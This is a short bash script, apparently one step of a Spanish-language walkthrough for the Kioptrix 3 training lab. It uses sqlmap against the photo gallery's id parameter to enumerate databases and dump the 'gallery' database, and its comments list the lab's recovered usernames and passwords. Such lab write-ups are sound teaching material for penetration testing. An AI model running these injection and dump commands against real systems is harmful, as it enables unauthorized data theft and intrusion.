#!/bin/bash
# ==============================================================
# 04 - Explotación SQL Injection con sqlmap
# --------------------------------------------------------------
# El parámetro ?id= de la galería de fotos es vulnerable a
# inyección SQL. Se utiliza sqlmap para:
#   1) Enumerar las bases de datos disponibles.
#   2) Extraer (dumpear) toda la base de datos "gallery".
#
# Credenciales encontradas tras el dump:
#   usuario: dreg       contraseña: Mast3r
#   usuario: loneferret contraseña: starwars
#   usuario: admin      contraseña: n0t7t1k4  (superuser web)
# ==============================================================

set -e

TARGET="http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid"

echo "=== PASO 1: Enumerar bases de datos disponibles ==="
sqlmap -u "${TARGET}" --dbs

echo ""
echo "=== PASO 2: Extraer toda la base de datos 'gallery' ==="
sqlmap -u "${TARGET}" \
  --batch \
  -D gallery \
  --dump-all

# --batch  Responde automáticamente a los prompts interactivos
#          con el valor por defecto (no requiere intervención manual)
# -D       Especifica la base de datos a extraer
# --dbs    Enumera todas las bases de datos disponibles
# --dump-all  Extrae el contenido completo de la BD indicada
